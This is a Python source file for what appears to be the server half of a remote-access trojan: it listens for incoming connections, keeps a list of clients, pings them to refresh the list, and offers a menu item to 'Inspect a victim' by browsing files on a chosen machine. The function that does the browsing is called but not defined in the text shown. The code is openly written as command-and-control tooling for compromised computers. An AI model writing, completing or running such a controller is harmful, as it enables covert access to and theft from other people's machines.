import socket
import threading
import os
import sys

class Server:

    def __init__(self, hostname, port):
        self.connections = []
        self.locking = threading.Lock()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((hostname, port))
        self.socket.listen(5)
        self.run()

    def accept_connections(self):

        while True:
            socket, addr = self.socket.accept()
            with self.locking:
                self.connections.append([socket, addr])

    def close_connections(self):

        with self.locking:
            for each in self.connections:
                each[0].shutdown(2)
                each[0].close()

    def refresh_connections(self):

        index = 0
        print("-----------------------------------")
        with self.locking:
            for each in self.connections:
                each[0].sendall(bytes("2", "UTF-8"))
                data = each[0].recv(1024)
                if (data):
                    print("| %d)%s %10s" % (index, each[1], "|"))
                    index += 1
                else:
                    self.connections.remove(each)
        print("-----------------------------------")

    def run(self):

        threading.Thread(target=self.accept_connections, daemon=True).start()
        while True:
            print("Items to do:\n")
            print("1) Refresh connections.")
            print("2) Inspect a victim.")
            print("0) Exit.\n")

            option = input("What u want to do? ")

            if option == "1":
                os.system('clear')
                self.refresh_connections()

            elif option == "2":
                client_id = input("Choose wisely: ")
                os.system('clear')
                with self.locking:
                    try:
                        client = self.connections[int(client_id)]
                        file_browser(client)
                    except IndexError:
                        print("Index does not exist. \n")
            elif option == "0":
                self.close_connections()
                sys.exit(0)
            else:
                print("\nPerhaps you better start from the beginning.")
                input("")
                os.system("clear")
